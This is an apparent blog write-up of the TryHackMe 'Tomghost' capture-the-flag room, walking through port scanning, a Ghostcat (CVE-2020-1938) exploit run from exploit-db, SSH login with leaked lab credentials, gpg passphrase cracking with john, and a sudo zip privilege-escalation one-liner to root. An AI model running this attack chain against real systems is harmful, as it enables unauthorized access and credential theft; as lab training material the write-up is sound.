---
title: "Tomghost"
date: 2024-11-15
draft: false
summary: "Writeup for Tomghost CTF challenge on TryHackMe."
tags: ["linux", "lfi", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/tomghost/cover.webp"
  caption: "Tomghost TryHackMe Challenge"
  alt: "Tomghost cover"
platform: "TryHackMe"
---

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/r/room/tomghost

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and the services running on the target.

```shell
nmap -A -p- TARGET -oN tomghost.nmap --min-rate 10000
```

| **Port** | **Service**  |
| -------- | ------------ |
| 22       | ssh          |
| 53       | dns          |
| 8009     | apache jserv |
| 8080     | http         |

![](https://cdn.ziomsec.com/tomghost/1.webp)

## Initial Foothold

The **nmap** scan revealed a tomcat server running on the target so I accessed it through my browser.

![](https://cdn.ziomsec.com/tomghost/2.webp)

I also bruteforced directories using **ffuf**

```shell
ffuf -u http://TARGET:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 302
```

![](https://cdn.ziomsec.com/tomghost/3.webp)

I discovered the manager console but was denied access to it.

![](https://cdn.ziomsec.com/tomghost/4.webp)

Since I did not know much about AJP, I read about it on **hacktricks** and found that the tomcat server might be vulnerable to **CVE-2020-1938**.
- https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp

![](https://cdn.ziomsec.com/tomghost/5.webp)

Hence, I looked for exploits and found one on exploit-db
- https://www.exploit-db.com/exploit/48143

I downloaded and ran the exploit and got a username and password.

```shell
python2 exploit.py TARGET
```

![](https://cdn.ziomsec.com/tomghost/6.webp)

I tested if the credentials could be used for **ssh** and finally used **ssh** to get shell access on the target.

```shell
ssh -l 'skyfuck' -p '8730281lkjdqlksalks' ssh://TARGET
```

![](https://cdn.ziomsec.com/tomghost/7.webp)

![](https://cdn.ziomsec.com/tomghost/8.webp)

I found a **gpg** encrypted file and a **gpg** key.

![](https://cdn.ziomsec.com/tomghost/9.webp)

I also found the user flag in *merlin*'s home directory.

```shell
cat /home/merlin/user.txt
```

![](https://cdn.ziomsec.com/tomghost/10.webp)

## Privilege Escalation

I used **linpeas** to do privilege escalation checks but found nothing interesting. Since I had an encrypted file that I hadn't analyzed, I transferred the file and the key to my local system.

![](https://cdn.ziomsec.com/tomghost/11.webp)

I imported the **gpg** key and tried decrypting the **encrypted** file, however, I was asked for a passphrase.

```shell
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

![](https://cdn.ziomsec.com/tomghost/12.webp)

Since I did not have a passphrase, I attempted to crack it using **john**. I first converted the key file to **john** format and then cracked it to find the password.

```shell
gpg2john tryhackme.asc > myhash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg myhash
```

![](https://cdn.ziomsec.com/tomghost/13.webp)

After finding the valid password, I decrypted the file and found credentials for *merlin*.

```shell
gpg --decrypt credential.pgp
```

![](https://cdn.ziomsec.com/tomghost/14.webp)

I switched user to *merlin*

```shell
su merlin
```

![](https://cdn.ziomsec.com/tomghost/15.webp)

Then I looked for my **sudo** privileges and found I was allowed to execute **zip** as root.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/tomghost/16.webp)

I visited **gtfobins** and found a way to exploit the **sudo** privileges to get a privileged access.
- https://gtfobins.github.io/gtfobins/zip/

```shell
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
```

![](https://cdn.ziomsec.com/tomghost/17.webp)

Finally I captured the root flag from the */root* directory.

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/tomghost/18.webp)

That's it from my side.
Happy hacking :)

---